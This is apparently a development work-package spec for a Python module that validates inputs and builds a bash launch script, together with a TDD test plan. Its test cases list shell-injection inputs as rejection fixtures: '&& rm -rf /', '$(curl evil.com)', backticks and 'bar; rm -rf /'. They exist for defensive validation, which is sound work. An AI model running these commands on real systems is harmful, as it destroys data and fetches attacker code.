---
id: WP-001
title: Create `_terminal_launcher.py` with `_build_launch_script` + input validators
status: pending
sequence_id: WP-001
dependsOn: []
blocks: [WP-002, WP-003]
primitive: create
group: EXPAND
kind: backend
estimated_token_cost:
  input: 6k
  output: 4k
tdd_section: "3.1 Form (public API + internal structure) + 3.2 Armor (input validation, env-leak prevention)"
adrs: [ADR-001, ADR-002]
---

## Context

This is the foundational WP for the terminal-launcher-port. Creates the new module file `plugins/sulis/scripts/_terminal_launcher.py` with the pure-logic layer: input validators and the shell-script generator. No subprocess work yet — that's WP-002.

Per TDD § Form, the module is underscore-prefixed (matches `_wpxlib.py` convention — see ADR-002). Per TDD § Armor, every input is validated before string concatenation (MUC-1 shell injection); the generated script begins with an env-scrub preamble (MUC-2 env-leak).

Components advanced from PRIMITIVE_TREE: none — net-new module.

## Contract

```python
# plugins/sulis/scripts/_terminal_launcher.py — created in this WP

from pathlib import Path

# Public API surface — fully present in this WP but only the validators
# + script builder are functional. launch_change_terminal lands in WP-003.

# === Validators (pure functions, no subprocess) ===

def validate_entry_command(cmd: str) -> tuple[bool, str]:
    """Whitelist: ^[a-z][a-z0-9 \\-]+$ (default 'claude --agent sulis')."""

def validate_extra_env_key(key: str) -> tuple[bool, str]:
    """POSIX env-var convention: ^[A-Z_][A-Z0-9_]*$"""

def validate_worktree_path(path: Path | str) -> tuple[bool, Path]:
    """Resolve path; assert it's an existing directory."""

# === Shell-script builder ===

def _build_launch_script(
    change_id: str,
    worktree_path: Path,
    entry_command: str = "claude --agent sulis",
    extra_env: dict[str, str] | None = None,
) -> str:
    """Return the bash script body (string).

    Pre-conditions (caller's responsibility — but this function also
    re-validates as defence in depth):
    - change_id passes _wpxlib.validate_change_ulid
    - worktree_path passes validate_worktree_path
    - entry_command passes validate_entry_command
    - extra_env keys pass validate_extra_env_key
    - extra_env values are shlex-quoted before insertion

    Script structure:
        #!/usr/bin/env bash
        set -euo pipefail
        unset $(compgen -v | grep -Ev '^(PATH|HOME|USER|TERM|LANG|LC_.*)$')
        export SULIS_CHANGE_ID="{change_id}"
        {extra_env_block}
        cd "{worktree_path}"
        exec {entry_command}
    """
```

State invariants:
- Validators MUST return `(False, reason)` for any input that would enable shell injection (`;`, `\n`, `$()`, backticks, unquoted `*`, etc.).
- `_build_launch_script` MUST NOT use f-string interpolation for `extra_env` values without `shlex.quote`.
- Generated script MUST begin with the env-scrub `unset` line before any `export`.

## Definition of Done

### Red — Failing tests written

- [ ] `tests/unit/test_terminal_launcher.py::test_validate_entry_command_accepts_default` — `"claude --agent sulis"` → `(True, "")`
- [ ] `tests/unit/test_terminal_launcher.py::test_validate_entry_command_rejects_injection` (parametrized: `";"`, `"&& rm -rf /"`, `"$(curl evil.com)"`, backtick injection) — all return `(False, ...)`
- [ ] `tests/unit/test_terminal_launcher.py::test_validate_extra_env_key_accepts_posix_names` (parametrized: `SULIS_FOO`, `MY_VAR_42`, `_X`) — all return `(True, "")`
- [ ] `tests/unit/test_terminal_launcher.py::test_validate_extra_env_key_rejects_invalid` (parametrized: lowercase, dashes, `\n`, leading digit) — all return `(False, ...)`
- [ ] `tests/unit/test_terminal_launcher.py::test_validate_worktree_path_accepts_existing_dir` (uses tmp_path)
- [ ] `tests/unit/test_terminal_launcher.py::test_validate_worktree_path_rejects_nonexistent`
- [ ] `tests/unit/test_terminal_launcher.py::test_validate_worktree_path_rejects_file_not_dir`
- [ ] `tests/unit/test_terminal_launcher.py::test_build_launch_script_includes_env_scrub` — generated script contains the `unset $(compgen -v | grep -Ev '...')` line
- [ ] `tests/unit/test_terminal_launcher.py::test_build_launch_script_exports_sulis_change_id` — verifies the `export SULIS_CHANGE_ID="..."` line for a known ULID
- [ ] `tests/unit/test_terminal_launcher.py::test_build_launch_script_inserts_extra_env_shlex_quoted` — `{"FOO": "bar; rm -rf /"}` becomes `export FOO='bar; rm -rf /'` (quoted)
- [ ] `tests/unit/test_terminal_launcher.py::test_build_launch_script_cd_then_exec_order` — `cd` line appears before the `exec` line

### Green — Implementation makes tests pass

- [ ] All Red tests pass
- [ ] `_build_launch_script` ≤ 60 LOC (target — small surface)
- [ ] Implementation follows `references/boring-code.md` — explicit types, no metaprogramming, stdlib only
- [ ] Module docstring present + cites the change-as-primitive design doc + ADR-001 + ADR-002
- [ ] Coverage on `_terminal_launcher.py` ≥ 90% (only the parts landed in this WP)

### Blue — Refactor complete

- [ ] Whitelist regexes extracted to module-level constants (`_ENTRY_COMMAND_RE`, `_ENV_KEY_RE`) — readability
- [ ] Shared error-construction helper if validators end up with duplicated error message scaffolding
- [ ] No new behaviour introduced in Blue
- [ ] All tests still green after refactor

## Sequence

- **dependsOn:** none (foundational WP)
- **blocks:** WP-002 (extends this module with dispatchers), WP-003 (extends this module with the public entry point)
- **Parallelisable with:** none (other WPs touch the same file)

## Estimated Token Cost

- **Input:** ~6k (TDD § Form + Armor sections + ADR-001 + ADR-002 + relevant `_wpxlib.py` patterns for validator shape)
- **Output:** ~4k (the module file + test file ~150 LOC each)
- **Total:** ~10k

## Notes

- Validators return `(bool, str)` tuples — matches the existing `validate_change_slug` / `validate_change_primitive` shape in `_wpxlib.py` for consistency.
- `_build_launch_script` is private (underscore-prefixed) — callers go through `launch_change_terminal` which lands in WP-003.
- The `compgen` env-scrub line is bash-specific. Document this in the module docstring; sulis assumes bash-or-zsh on macOS and Linux (default shells on both platforms).
